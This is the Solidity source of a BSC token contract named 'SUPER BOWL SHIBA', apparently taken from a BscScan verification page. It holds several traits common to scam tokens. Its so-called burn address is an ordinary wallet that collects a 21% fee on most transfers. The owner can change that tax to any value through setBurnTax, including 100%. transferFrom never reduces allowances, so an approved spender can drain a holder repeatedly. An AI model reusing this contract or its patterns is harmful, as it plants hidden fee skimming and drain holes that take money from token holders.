/**
 *Submitted for verification at BscScan.com on 2022-02-13
*/

//SPDX-License-Identifier: OSL 3.0



pragma solidity ^0.8.11;


abstract contract Context{
    function _msgSender() internal view virtual returns (address)
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata)
    {
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 public _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns(address)
    {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner()
    {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyOwner
    {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract superbowlshiba is Context, Ownable{
    mapping (address => uint256) public balance;
    mapping (address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000000 * 10 ** 9;
    string public name = "SUPER BOWL SHIBA";
    string public symbol = "SBS";
    uint256 public decimals = 9;

    uint256 public burnTaxPercent = 21;
    address public burnAddress = 0xAf4Ed94FC92bB27375310E86097D7a113Dc032Ef;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        balance[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function calculateTaxes(uint256 amount) private view returns(uint256){
       uint256 taxAmount = 0;
       if (amount > 100) {
           taxAmount = amount * burnTaxPercent / 100;
       }
       return taxAmount;
    }
    
    function balanceOf(address owner) public view returns(uint256) {
        return balance[owner];
    }
   
    function transfer(address to, uint256 value) public returns(bool) {
        require(balanceOf(_msgSender()) >= value, "Balance is too low");
        uint256 taxes = calculateTaxes(value);
        uint256 newAmount = value - taxes;
        balance[to] += newAmount;
        balance[_msgSender()] -= value;
        balance[burnAddress] += taxes;
        emit Transfer(_msgSender(), to, newAmount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(balanceOf(from) >= value, "Balance is too low.");
        require(allowance[from][_msgSender()] >= value, "Allowance is too low");
        uint256 taxes = calculateTaxes(value);
        uint256 newAmount = value - taxes;
        balance[to] += newAmount;
        balance[from] -= value;
        balance[burnAddress] += taxes;
        emit Transfer(from, to, newAmount);
        return true;   
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[_msgSender()][spender] = value;
        emit Approval(_msgSender(), spender, value);
        return true;   
    }

    function setBurnTax(uint256 newTax) public onlyOwner {
        burnTaxPercent = newTax;       
    }
}